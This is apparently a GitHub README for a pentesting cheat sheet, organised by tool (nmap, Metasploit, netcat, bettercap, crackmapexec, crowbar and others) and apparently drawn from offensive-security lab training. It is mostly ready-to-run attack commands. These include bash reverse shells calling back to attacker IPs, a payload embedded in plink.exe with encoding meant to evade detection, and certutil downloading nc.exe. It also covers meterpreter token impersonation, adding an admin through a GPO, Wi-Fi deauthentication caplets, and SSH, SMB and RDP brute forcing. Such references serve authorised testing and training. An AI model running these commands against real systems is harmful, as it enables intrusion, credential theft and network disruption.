
# Penooo-Cheatsheet for Pentesting

A collection of **useful commands and scripts** for pentesting tools, organized by the specific tools used. This repository serves as a handy reference for commonly used tools and their commands, making your pentesting tasks faster and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Tool-Based Commands](#tool-based-commands)
  - [Nmap](#nmap)
  - [Gobuster](#gobuster)
  - [Metasploit](#metasploit)
  - [Netcat](#netcat)
  - [SearchSploit](#searchsploit)
  - [TCPDump](#tcpdump)
  - [GMSAPasswordReader](#gmsapasswordreader)
  - [GetSPN](#getspn)
  - [PowerUp](#powerup)
  - [Powerview](#powerview)
  - [PrivescCheck](#privesccheck)
  - [SharpGPOAbuse](#sharpgpoabuse)
  - [Accesschk](#accesschk)
  - [Apt](#apt)
  - [Arp](#arp)
  - [Awk](#awk)
  - [Bc](#bc)
  - [Bettercap](#bettercap)
  - [BloodHound](#bloodhound)
  - [Cadaver](#cadaver)
  - [Cat](#cat)
  - [Certutil](#certutil)
  - [Cewl](#cewl)
  - [Chisel](#chisel)
  - [Cmd](#cmd)
  - [Comm](#comm)
  - [Crackmapexec](#crackmapexec)
  - [Crowbar](#crowbar)
  - [Crunch](#crunch)
  - [Curl](#curl)
  - [Cut](#cut)
  - [Debugfs](#debugfs)
  - [Diff](#diff)
  - [Dig](#dig)
  - [Dir](#dir)
  - [Dirb](#dirb)
  - [Dnsrecon](#dnsrecon)
  - [Docker](#docker)
  - [Evil-winrm](#evil-winrm)
  - [Exiftool](#exiftool)
  - [Ffuf](#ffuf)
  - [Find](#find)
  - [Findstr](#findstr)
  - [Foremost](#foremost)
  - [Gcc](#gcc)
  - [Git](#git)
  - [Gpg](#gpg)
  - [Hashcat](#hashcat)
  - [Host](#host)
  - [Httptunnel](#httptunnel)
  - [Hydra](#hydra)
  - [Icacls](#icacls)
  - [Iconv](#iconv)
  - [Impacket](#impacket)
  - [Ip](#ip)
  - [Iptables](#iptables)
  - [John](#john)
  - [Kerberoast](#kerberoast)
  - [Ln](#ln)
  - [Ls](#ls)
  - [Man](#man)
  - [Masscan](#masscan)
  - [Medusa](#medusa)
  - [Mimikatz](#mimikatz)
  - [Mingw-64](#mingw-64)
  - [Mklink](#mklink)
  - [Mosquitto_sub](#mosquitto_sub)
  - [Mount](#mount)
  - [Msfvenom](#msfvenom)
  - [Mysql](#mysql)
  - [Nbt scan](#nbt-scan)
  - [Nc](#nc)
  - [Nessus](#nessus)
  - [Net](#net)
  - [Netsh](#netsh)
  - [Netstat](#netstat)
  - [Nslookup](#nslookup)
  - [Onesixtyone](#onesixtyone)
  - [Openssl](#openssl)
  - [Passwd](#passwd)
  - [Phpggc](#phpggc)
  - [Plink](#plink)
  - [Powercat](#powercat)
  - [Powershell](#powershell)
  - [Psexec](#psexec)
  - [Pth-winexe](#pth-winexe)
  - [Python](#python)
  - [Recon-ng](#recon-ng)
  - [Redis](#redis)
  - [Reg](#reg)
  - [Responder](#responder)
  - [Rinetd](#rinetd)
  - [Rlwrap](#rlwrap)
  - [Rpcclient](#rpcclient)
  - [Rsmangler](#rsmangler)
  - [Runas](#runas)
  - [Sc](#sc)
  - [Schtasks](#schtasks)
  - [Scp](#scp)
  - [Sed](#sed)
  - [SendEmail](#sendemail)
  - [Sharphound](#sharphound)
  - [Shellter](#shellter)
  - [Smbclient](#smbclient)
  - [Snmpwalk](#snmpwalk)
  - [Socat](#socat)
  - [Spose](#spose)
  - [Sqlmap](#sqlmap)
  - [Sqsh](#sqsh)
  - [Ssh](#ssh)
  - [Steghide](#steghide)
  - [Svn](#svn)
  - [Tail](#tail)
  - [Tar](#tar)
  - [Tasklist](#tasklist)
  - [Tcpdump](#tcpdump)
  - [Terminal](#terminal)
  - [Theharverster](#theharverster)
  - [Tr](#tr)
  - [Ufw](#ufw)
  - [Uname](#uname)
  - [Watch](#watch)
  - [Wc](#wc)
  - [Webservers](#webservers)
  - [Wfuzz](#wfuzz)
  - [Whois](#whois)
  - [Wpscan](#wpscan)
  - [Xfreerdp](#xfreerdp)
  - [Xxd](#xxd)
  - [Ysosoerial](#ysosoerial)
- [Payloads](#payloads)
  - [Cross-Site Scripting (XSS) Payloads](#xss-payloads)
  - [XML External Entity (XXE) / XML Payloads](#xml-payloads)
  - [SQL Injection (SQLi) Payloads](#sql-payloads)
  - [Antivirus (AV) Bypass](#av-bypass)
  - [Buffer Overflow (BOF) Linux (LIN)](#bof-lin)
  - [Buffer Overflow (BOF) Windows (WIN)](#bof-win)
  - [Access Control Vulnerabilities](#access-control-vulnerabilities)
  - [Active Directory (AD)](#ad)
  - [Bindshells](#bindshells)
  - [Brute Force](#brute-force)
  - [Clickjacking](#clickjacking)
  - [Cross-Origin Resource Sharing (CORS)](#cors)
  - [Cross-Site Request Forgery (CSRF)](#csrf)
  - [Database Vulnerabilities (DB)](#db)
  - [Directory Traversal (DIR)](#dir)
  - [File Transfer](#file-transfer)
  - [File Upload](#file-upload)
  - [File Transfer Protocol (FTP)](#ftp)
  - [GraphQL](#graphql)
  - [Hashing Attacks](#hash)
  - [Host Header Injection](#host-header-injection)
  - [HTML Application (HTA)](#hta)
  - [HTTP Header Attacks](#http-header)
  - [HTTP Request Smuggling](#http-request-smuggling)
  - [Internet Relay Chat (IRC)](#irc)
  - [JSON Web Token (JWT)](#jwt)
  - [Local File Inclusion (LFI)](#lfi)
  - [Macros](#macro)
  - [Network File System (NFS)](#nfs)
  - [Operating System (OS) Vulnerabilities](#os)
  - [Other Vulnerabilities](#others)
  - [phpMyAdmin](#phpmyadmin)
  - [Privilege Escalation Linux (LIN)](#priv-lin)
  - [Privilege Escalation Windows (WIN)](#priv-win)
  - [Reverse Shells](#reverseshells)
  - [Remote File Inclusion (RFI)](#rfi)
  - [Serialization and Deserialization Vulnerabilities](#serialization-deserialization)
  - [Shellshock](#shellshock)
  - [Server Message Block (SMB)](#smb)
  - [Simple Mail Transfer Protocol (SMTP)](#smtp)
  - [Simple Network Management Protocol (SNMP)](#snmp)
  - [Server-Side Request Forgery (SSRF)](#ssrf)
  - [Server-Side Template Injection (SSTI)](#ssti)
  - [Symfony](#symfony)
  - [Trivial File Transfer Protocol (TFTP)](#tftp)
  - [Web Cache Poisoning](#web-cache-poisoning)
  - [Wireless Vulnerabilities](#wireless)
  - [wkhtmltopdf](#wkhtmltopdf)
  - [WordPress (WP)](#wp)
  - [WebSocket (WS)](#ws)
  - [XPath Injection](#xpath)
- [Shells](#shells)
  - [Reverse Shells](#reverse-shells)
  - [Bind Shells](#bind-shells)
- [Useful Resources](#useful-resources)
  - [Payloads and Exploits](#payloads-and-exploits)
  - [Pentesting Guides](#pentesting-guides)
  - [Security Tools](#security-tools)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- Comprehensive list of commands for various pentesting tools
- Pre-written scripts for automating common activities
- Beginner-friendly and updated with modern techniques

---

## Installation

Clone the repository to your local machine:

```bash
git clone https://github.com/<your-username>/cheatsheet-pentesting.git
```

Navigate to the directory:

```bash
cd cheatsheet-pentesting
```

---

## Usage

1. Browse through the tool categories to find relevant commands or scripts.
2. Use the provided commands directly in your terminal.
3. For scripts, make them executable if needed:

   ```bash
   chmod +x <script-name>.sh
   ./<script-name>.sh
   ```

4. Customize the scripts based on your specific target or environment.

---

## Tool-Based Commands

### Nmap
- **Basic Scan**:
  ```bash
  nmap -sV -A <target-IP>
  ```

- **Scan Specific Ports**:
  ```bash
  nmap -p 80,443 <target-IP>
  ```

- **OS Detection**:
  ```bash
  nmap -O <target-IP>
  ```
- **Basic full TCP Connect Scan**:
  ```bash
  nmap -sT 10.11.1.220
  ```
- **Comprehensive Service Enumeration**:
  ```bash
  sudo nmap 10.11.0.128 -p- -sV -vv --open --reason
  ```
- **MSSQL-Specific Scan**:
  ```bash
  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 -vvv -Pn 10.11.1.31
  ```
- **Host Discovery (Network Sweep)**:
  ```bash
  nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
  grep Up ping-sweep.txt | cut -d " " -f 2
  ```
- **Web Server Discovery**:
  ```bash
  nmap -p 80 10.11.1.1-254 -oG web-sweep.txt
  grep open web-sweep.txt | cut -d" " -f2
  ```
- **Top Ports Scan**:
  ```bash
  nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
  ```
- ** NSE OS Discovery**:
  ```bash
  nmap 10.11.1.220 --script=smb-os-discovery
  ```
- **DNS Zone Transfer**:
  ```bash
  nmap --script=dns-zone-transfer -p 53 ns2.megacorpone.com
  ```
- **Exploring Nmap Scripts**:
  ```bash
  cd /usr/share/nmap/scripts/
  head -n 5 script.db
  cat script.db | grep '"vuln"\|"exploit"'
  ```
- **Vulnerability Scanning**:
  ```bash
  nmap --script=smb-vuln\* 192.168.182.40
  ```
- **UDP Scanning**:
  ```bash
  nmap -T5 -sV -sU -vvv --open 10.129.27.254
  ```

---
### Gobuster
- **Directory Enumeration**:
  ```bash
  gobuster dir -u http://<target> -w /path/to/wordlist.txt
  ```

- **DNS Subdomain Enumeration**:
  ```bash
  gobuster dns -d <target-domain> -w /path/to/wordlist.txt
  gobuster dns -d Domain.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  ```
- **Directory Search (Brute Force Directory Discovery) with Disabling SSL verification**:
  ```bash
  gobuster dir -u https://10.11.1.237/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
  ```

- **Authenticated Search (Directory Brute Forcing with Authentication) with Basic authentication**:
  ```bash
  gobuster dir -U admin -P admin -w /usr/share/wordlists/dirb/common.txt -u http://192.168.120.73/svn
  ```
- **Brute Force Extensions (Try Various File Extensions)**:
  ```bash
  gobuster dir -u 192.168.1.33 -x php,html,zip -t 130 -w ~/wordlists/big.txt
  ```
---
### Metasploit
- **Initializing the Metasploit Database**:
  ```bash
  sudo systemctl start postgresql
  sudo systemctl enable postgresql
  sudo msfdb init
  ```

- **Updating the Metasploit Framework**:
  ```bash
  sudo apt update; sudo apt install metasploit-framework
  ```

- **Start Metasploit Console**:
  ```bash
  msfconsole
  ```

- **Search for Exploits: Searching SMB Modules**:
  ```bash
  search <exploit-name>
  search type:auxiliary name:smb
  ```

- **Workspaces in Metasploit**:
  ```bash
  msf> workspace         # List workspaces
  msf> workspace test    # Create/switch to a workspace named "test"
  ```
- **Staged vs Non-Staged Payload Syntax**:
  ```bash
  windows/shell/reverse_tcp    #Staged Payload
  windows/shell_reverse_tcp    #Non-Staged Payload
  ```
  Staged Payload: Small payload that fetches the actual exploit in parts. Non-Staged Payload: Self-contained payload.
- **Search for Exploits**:
  ```bash
  search <exploit-name>
  ```

- **Embedding a Payload in plink.exe**:
  ```bash
  msf> generate -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
  ```
- **Multi/Handler Configuration**:
  ```bash
  msf> use multi/handler
  msf> set payload windows/meterpreter/reverse_https
  msf> set LHOST 192.168.118.2
  msf> set LPORT 443
  msf> exploit -j   # Run as a job
  msf> jobs -i 0    # Interact with job ID 0
  ```

- **Advanced Multi/Handler Options: Enabling staged encoding for evasion:**:
  ```bash
  msf> show advanced
  msf> set EnableStageEncoding true
  msf> set StageEncoder x86/shikata_ga_nai
  msf> set AutoRunScript windows/gather/enum_logged_on_users
  ```
- **Advanced Multi/Handler Options: Changing Meterpreter transports dynamically:**:
  ```bash
  meterpreter> transport list
  meterpreter> transport add -t reverse_tcp -l 192.168.118.2 -p 5555
  ```

- **Automating Metasploit Execution**:
  ```bash
  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
  ```
- **Post-Exploitation with Incognito**:
  ```bash
  meterpreter > use incognito
  meterpreter > list_tokens -u   # List available tokens (user)
  meterpreter > impersonate_token sandbox\\Administrator
  [+] Successfully impersonated user sandbox\Administrator
  meterpreter > getuid
  Server username: sandbox\Administrator
  ```
- **Automating Metasploit Execution**:
  ```bash
  sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 10.11.0.4; set LPORT 443; run"
  ```

---
### Netcat
- **Set Up a Listener**:
  ```bash
  nc -lvnp 4444
  ```

- **Send a File**:
  ```bash
  nc -w 3 <target-IP> 1234 < file.txt
  ```

- **Reverse Shell**:
  ```bash
  bash -i >& /dev/tcp/<your-IP>/4444 0>&1
  ```
- **Perform a TCP scan on ports 3388 to 3390**:
  ```bash
  nc -nvv -w 1 -z 10.11.1.220 3388-3390
  ```

- **Perform a UDP scan on ports 160 to 162**:
  ```bash
  nc -nv -u -z -w 1 10.11.1.115 160-162
  ```
---
### SearchSploit
- **Search for Exploits**:
  ```bash
  searchsploit <software-name>
  ```

- **Copy Exploit to Current Directory**:
  ```bash
  searchsploit -m <exploit-path>
  ```
---
### TCPDump
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Filter by Port**:
  ```bash
  tcpdump -i <interface> port 80
  ```
- **Using tcpdump to read packet capture**:
  ```bash
  tcpdump -r <file>
  sudo tcpdump -r password_cracking_filtered.pcap
  ```

- **Write Capture to File**:
  ```bash
  tcpdump -i <interface> -w capture.pcap
  ```

- **Using tcpdump to read the packet capture in hex/ascii output**:
  ```bash
  tcpdump -nX -r <file>
  sudo tcpdump -nX -r password_cracking_filtered.pcap
  ```
- **Capture Traffic on an Interface**:
  ```bash
  tcpdump -i <interface>
  ```

- **Using tcpdump basic filters**:
  ```bash
  sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
  sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
  sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
  sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
  sudo tcpdump -nX -r password_cracking_filtered.pcap
  ```
  -n option to skip DNS name lookups and -r to read from our packet capture file
  
- **Using tcpdump with some advanced filtering**:
  ```bash
  echo "$((2#00011000))" --> 24
  sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap
  ```
  The ACK and PSH are represented by the fourth and fifth bits of the 14th byte, respectively.the tcpdump array index used for counting the bytes starts at zero, so the 
  syntax should be (tcp[13]).
  
- **sniffing with tcpdump**:
  ```bash
  tcpdump -i <interface> -A
  tcpdump -i lo -A
  ```
- **sniffing everything and saving to an output file**:
  ```bash
  tcpdump -i <interface> -w <output>
  sudo tcpdump -i any -w os.pcap
  ```
---
### GMSAPasswordReader
- **Retrieve gMSA Password**:
  ```powershell
  GMSAPasswordReader.exe <gMSA-Name>
  ```
- **Retrieving the Hash of a Service Account**:
  ```powershell
  ./GMSAPasswordReader.exe --accountname svc_apache
  ```

---

### GetSPN
- **List SPNs for a Domain**:
  ```powershell
  GetSPN -Domain <domain> -Username <username>
  ```

- **Export SPNs to File**:
  ```powershell
  GetSPN -Domain <domain> -Username <username> > spns.txt
  ```
- **Retrieving Service Names from Active Directory**:
  ```powershell
  Get-NetUser -SPN | Select-Object serviceprincipalname
  Get-NetUser -SPN | select serviceprincipalname
  ```
---

### PowerUp
- **Check Privilege Escalation Opportunities**:
  ```powershell
  Import-Module .\PowerUp.ps1
  Invoke-AllChecks
  ```

---

### Powerview
- **Installing and Importing PowerView**:
  ```powershell
  Import-Module .\PowerView.ps1

  ```
- **List Domain Admins**:
  ```powershell
  Get-DomainAdmin
  Get-DomainGroupMember -Identity "Domain Admins"
  Get-DomainGroup | select name, member

  ```

- **Enumerate All Group Memberships**:
  ```powershell
  Get-DomainGroupMember -GroupName "Domain Admins"
  ```

- **Find Local Admins on Target Machine**:
  ```powershell
  Get-NetLocalGroupMember -Group "Administrators" -Computer <target-computer>
  ```
- **Enumerating Logged-In Users**:
  ```powershell
  Get-NetLoggedon -ComputerName client251
  Get-NetSession -ComputerName dc01

  ```
- **Enumerating Computers in the Domain**:
  ```powershell
  Get-DomainComputer | select samaccountname, name

  ```
- **Enumerating Domain Users**:
  ```powershell
  Get-DomainUser | select memberof, name

  ```
- **Recursively list all members, including nested groups:**:
  ```powershell
  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

  ```
- **Group Policy Enumeration**:
  ```powershell
  Get-NetGPO
  Get-GPPermission -Guid 31B2F340-016D-11D2-945F-00C04FB984F9 -TargetType User -TargetName tester

  ```
- **Hunting for Active Domain Admin Sessions**:
  ```powershell
  Invoke-UserHunter -CheckAccess

  ```
---

### PrivescCheck
- **Run Privilege Escalation Checks**:
  ```powershell
  .\PrivescCheck.ps1
  Invoke-PrivescCheck -Extended
  ```

---

### SharpGPOAbuse
- **Dump Group Policy Objects**:
  ```powershell
  SharpGPOAbuse.exe -domain <domain> -user <username> -password <password>
  ```

- **Check for GPO Misconfigurations**:
  ```powershell
  SharpGPOAbuse.exe -gpo <gpo-name> -check
  ```
- **Executing SharpGPOAbuse to add a user account (tester) to the local Administrators group by specifying the GPO**:
  ```powershell
  SharpGPOAbuse.exe --AddLocalAdmin --UserAccount tester --GPOName "Default Domain Policy"
  [+] Domain = vault.offsec
  [+] Domain Controller = DC.test.local
  [+] ...
  [+] The GPO does not specify any group memberships.
  [+] versionNumber attribute changed successfully
  [+] The version number in GPT.ini was increased successfully.
  [+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
  [+] Done!
  --> updating the local Group Policy.
  cmd> gpupdate /force
  Updating policy...
  ```

---

### accesschk
- **Check User Permissions on a File**:
  ```bash
  accesschk.exe -u <username> <file-path>
  ```

- **Check Permissions on Registry Key**:
  ```bash
  accesschk.exe -k <registry-key-path>
  ```

- **Check for Vulnerable Services to Exploit**:
  ```bash
  accesschk.exe /accepteula -uwcqv "Authenticated Users" *
  ```
  u: Check the permissions for the user or group specified.
  w: Look for write permissions.
  c: Check for the ability to change service configurations.
  q: Suppress warnings and only display the output.
  v: Verbose output.
  Authenticated Users: Specifies the target user group. This tells the tool to check permissions for all authenticated users.
  *: Checks all services on the system for the specified permissions.
---

### apt
- ** Searching for the pure-ftpd Application**:
  ```bash
  apt-cache search pure-ftpd
  ```

- **Viewing Detailed Information About the resource-agents Package**:
  ```bash
  apt show resource-agents
  ```
- **Removing the pure-ftpd Package with Configuration Files**:
  ```bash
  apt remove --purge pure-ftpd
  ```

- **Installing the man-db Application from a Local .deb File**:
  ```bash
  sudo dpkg -i man-db_2.7.0.2-5_amd64.deb
  ```

---

### arp
- **Display ARP Table**:
  ```bash
  arp -a
  ```

- **Add Static ARP Entry**:
  ```bash
  arp -s <ip-address> <mac-address>
  sudo arp -s 10.0.0.2 AA:BB:CC:DD:EE:FF
  ```
- **Deleting an ARP Entry**:
  ```bash
  sudo arp -d 10.0.0.2
  ```

- **Displaying the ARP Table in a Detailed Format**:
  ```bash
  arp -en
  ```
---

### awk
- **Print Column from File**:
  ```bash
  awk '{print $1}' <file>
  ```

- **Search for a Pattern in File**:
  ```bash
  awk '/pattern/' <file>
  ```
- **Extracting Specific Fields from a Delimited String**:
  ```bash
  echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
  ```

- **Using awk with a Unique Delimiter to Process HTML Links**:
  ```bash
  grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpone\.com" | awk -F "http://" '{print $2}'
  ```
---

### bc
- **Basic Arithmetic**:
  ```bash
  echo "3 + 4" | bc
  ```

- **Square Root Calculation**:
  ```bash
  echo "sqrt(16)" | bc
  ```
- ** Converting a Binary Number to Decimal**:
  ```bash
  echo "ibase=2;11111" | bc
  ```

- **Converting a Decimal Number to Binary**:
  ```bash
  echo "obase=2;7" | bc
  ```
---

### bettercap
- **Start Sniffing on Interface**:
  ```bash
  bettercap -iface <interface> -caplet http-server
  sudo bettercap -iface wlan0
  ```

- **Enable HTTP Proxy**:
  ```bash
  bettercap -iface <interface> -proxy
  ```
- **Wi-Fi Reconnaissance**:
  ```bash
  wlan0 » wifi.recon on
  wlan0 » wifi.recon.channel 6,11
  wlan0 » wifi.show

  ```

- **Use Ticker to Continuously Display Data:**:
  ```bash
  wlan0 » set ticker.commands "clear; wifi.show"
  wlan0 » wifi.recon on
  wlan0 » ticker on

  ```
- **Automate Commands at Startup:**:
  ```bash
  sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"

  ```

- **Filtering and Targeting**:
  ```bash
  wlan0 » wifi.recon c6:2d:56:2a:53:f8
  wlan0 » wifi.show
  wlan0 » set wifi.show.filter ^c0
  wlan0 » wifi.show


  ```
- **Reset Filters and Set RSSI Threshold:**:
  ```bash
  wlan0 » set wifi.show.filter ""
  wlan0 » set wifi.rssi.min -49
  wlan0 » wifi.show

  ```

- **Deauthentication Attacks**:
  ```bash
  wlan0 » wifi.deauth c6:2d:56:2a:53:f8

  ```
- **Handling Handshakes**:
  ```bash
  wlan1 » wifi.recon off
  wlan1 » get wifi.handshakes.file 
  wlan0 » set wifi.handshakes.file "/home/kali/handshakes/"
  wlan0 » set wifi.handshakes.aggregate false
  wlan0 » wifi.recon on

  ```

- **Capture Handshake:**:
  ```bash
  wlan0 » wifi.deauth c6:2d:56:2a:53:f8
  -> Corporate (c6:2d:56:2a:53:f8) WPA2 handshake (full) to /home/kali/handshakes/Corporate_405d82dcb210.pcap

  ```
- **Skipping Specific BSSIDs**:
  ```bash
  wlan0 » set wifi.deauth.skip ac:22:0b:28:fd:22
  wlan0 » wifi.deauth c6:2d:56:2a:53:f8

  ```

- **Automating Deauthentication Using Caplets**:
  ```bash
  kali@kali:/usr/share/bettercap/caplets$ cat -n massdeauth.cap
  set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}

  ```
- **Custom Deauthentication Caplet for "Corporate":**:
  ```bash
  bettercap -iface <interface> -caplet http-server
  ```

- **Enable HTTP Proxy**:
  ```bash
  bettercap -iface <interface> -proxy
  ```
- **Start Sniffing on Interface**:
  ```bash
  kali@kali:~$ cat -n deauth_corp.cap 
  1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}
  2
  3  set ticker.period 10
  4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
  5
  6  events.ignore wifi.ap.new
  7  events.ignore wifi.client.probe
  8  events.ignore wifi.client.new
  9
  10  wifi.recon on
  11  ticker on
  12  events.clear
  13  clear

  ```

- **Run the Custom Caplet:**:
  ```bash
  sudo bettercap -iface wlan0 -caplet deauth_corp.cap
  ```
---

### bloodHound
- **Installing BloodHound**:
  ```bash
  sudo apt-get update
  sudo apt-get install bloodhound
  ```

  - **Starting and Configuring the Neo4j Database for BloodHound**:
  ```bash
  sudo neo4j console
  ```
  
- **Import Data into BloodHound**:
  ```bash
  BloodHound -c <config-file> -i <input-file>
  ```

- **Run BloodHound Enumeration**:
  ```bash
  BloodHound -c <config-file> -u <username> -p <password>
  ```

---

### cadaver
- **Connect to WebDAV Server**:
  ```bash
  cadaver <url>
  ```

- **List Files in Directory**:
  ```bash
  ls
  ```
  
- **Authenticating and Interacting with WebDAV Using Cadaver**:
  ```bash
  cadaver http://fakeserver.local/webdav/
  ```
---

### cat
- **View File Content**:
  ```bash
  cat <file-path>
  ```

- **Concatenate Multiple Files**:
  ```bash
  cat <file1> <file2>
  ```
- ** Reading a File with Line Numbers**:
  ```bash
  cat -n file
  ```

- **Creating a Reverse Shell Script using (`cat <<EOF ... EOF`) method**:
  ```bash
  cat <<EOF>> ./reverse-shell
  heredoc> #!/bin/bash
  heredoc>/bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
  heredoc>EOF
  ```
---

### certutil
- **Check Certificate Information**:
  ```bash
  certutil -dump <certificate-file>
  ```

- **Export Certificate**:
  ```bash
  certutil -exportPFX -user <certificate-name> <output-file>
  ```
- **Calculating the SHA-256 Hash of a File**:
  ```bash
  certutil -hashfile <file> sha256
  ```

- **Downloading a File Using Certutil**:
  ```bash
  certutil.exe -urlcache -f <url> <file>
  certutil.exe -urlcache -f http://192.168.119.156/nc.exe nc.exe
  ```

---

### cewl
- **Create Custom Wordlist from URL**:
  ```bash
  cewl <url> -w <output-file>
  ```

- **Create Wordlist from Specific Lengths**:
  ```bash
  cewl <url> -w <output-file> -l <min-length> -l <max-length>
  ```
- **Generating a Wordlist from a Website Using CeWL: `-m 6` Specifies the minimum word length**:
  ```bash
  cewl <url> -m <min-word-length> -w <output-file>
  cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
  ```

---

### chisel
- **Start a Local HTTP Proxy**:
  ```bash
  chisel server -p <port> --reverse
  ```

- **Connect to Remote HTTP Proxy**:
  ```bash
  chisel client <remote-server>:<remote-port> <local-port>:http
  ```
- **Setting Up Chisel Server/client for Remote Forwarding**:
  ```bash
  chisel server --reverse --port 9002
  chisel.exe client 192.168.119.125:9002 192.168.119.125:445 R:445:localhost:445
  ```
- **Example of General Port Forwarding**:
  ```bash
  ./chisel server -p 8083 --reverse
  ./chisel client 192.168.1.99:8083 R:6379:127.0.0.1:6379
  
  ```
- **Example: Forwarding MSSQL(Server)**:
  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ chisel server -p 8000 --reverse
  2022/03/21 14:21:59 server: Reverse tunnelling enabled
  2022/03/21 14:21:59 server: Fingerprint YqJoP81ML0mrD3p2Mhd+Ix6WRr1Wb7e61RFzukVAP3Q=
  2022/03/21 14:21:59 server: Listening on http://0.0.0.0:8000
  ```

- **Example: Forwarding MSSQL(Client)**:
  ```bash
  PS C:\xampp\htdocs\tmp\> .\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
  chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
  2022/03/21 11:17:46 client: Connecting to ws://192.168.118.23:8000
  2022/03/21 11:17:47 client: Connected (Latency 201.072ms)
  ```

---

### cmd
- **Open Command Prompt**:
  ```bash
  cmd
  ```

- **Run Command in Command Prompt**:
  ```bash
  cmd /c <command>
  ```
- **Using forfiles to Find the Path of a file e.g. notepad.exe**:
  ```bash
  forfiles /P C:\Windows /S /M notepad.exe /c "cmd /c echo @PATH"
  ```

- **Activating RDP (Remote Desktop Protocol)**:
  ```bash
  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
  ```
- **Searching for Files Using `where`**:
  ```bash
  where /r C:\ fodhelper.exe
  ```
---

### comm
- **Compare Two Files**:
  ```bash
  comm <file1> <file2>
  ```

- **Suppress Column from Output**:
  ```bash
  comm -23 <file1> <file2>
  ```

---

### crackmapexec
- **Enumerate SMB Shares**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> --shares
  ```

- **Run Commands on Target Machines**:
  ```bash
  crackmapexec smb <target-ip> -u <username> -p <password> -x "<command>"
  ```
- **Brute Force SSH on a Range of IPs**:
  ```bash
  crackmapexec ssh <target-ip-range> -u <username> -p <password> 
  crackmapexec ssh 10.11.1.0-254 -u user -p password
  ```

- **Brute Force SMB with a NTLM Hash on a Range of IPs**:
  ```bash
  crackmapexec smb <target-ip-range> -u <username> -H <NTLM>
  crackmapexec smb 10.11.1.1-200 -u user -H "aad3b41233433234435b51404ee:2d518fe2e4353259eae5db1"
  ```
- **Brute Force WinRM with Usernames and Hashs**:
  ```bash
  crackmapexec winrm <target-ip> -u <file> -H <file>
  crackmapexec winrm 192.168.155.175 -u users.txt -H hash.txt
  ```

### crowbar
- **Brute Force SMB Login**:
  ```bash
  crowbar smb -b <ip-address> -u <username> -p <password-list>
  ```

- **Brute Force SSH Login**:
  ```bash
  crowbar ssh -b <ip-address> -u <username> -p <password-list>
  ```
- **Brute Force RDP Login**:
  ```bash
  crowbar -b RDP -S <ip-address> -u <username> -C <password-list> -n 1
  crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
  ```
  `-n 1`: Limits the attack to use 1 thread for the brute-force attempt (you can increase the number for faster attacks, but with caution).
---

### crunch
- **Generate Wordlist of Given Lengths**:
  ```bash
  crunch <min-length> <max-length> -o <output-file>
  crunch 4 6 0123456789ABCDEF -o crunch.txt
  ```

- **Generate Wordlist with Custom Characters**:
  ```bash
  crunch 8 8 -t ,@@^^%%%
  #@	Lower case alpha characters
  #,	Upper case alpha characters
  #%	Numeric characters
  #^	Special characters including space
  ```
- **Generating password list of lower and upper case letters:**:
  ```bash
  crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt
  crunch 11 11  -f /usr/share/crunch/charset.lst lalpha -t  buddy%%%%^^ -o buddy.txt
  ```
- **Using Crunch to generate wordlist with the charset abc123 with word between 8 and 9 characters:**:
  ```bash
  crunch 8 9 abc123
  ```
- **Using Crunch to generate wordlist with starting with password and ending with three digits:**:
  ```bash
  crunch 11 11 -t password%%%
  ```
- **Using Crunch to generate wordlist starting with 'password' and ending with three digits - Alternate version:**:
  ```bash
  crunch 11 11 0123456789 -t password@@@
  ```
- **Using Crunch to generate wordlist using characters in 'abcde12345' without repeating any of them:**:
  ```bash
  crunch 1 1 -p abcde12345
  ```
- **Using Crunch to generate wordlist with multiple words instead of characters, without repeating them:**:
  ```bash
  crunch 1 1 -p dog cat bird
  ```
- **Using Crunch to generate wordlist with multiple words instead of characters, without repeating them and adding two digits:**:
  ```bash
  crunch 5 5 -t ddd%% -p dog cat bird
  ```
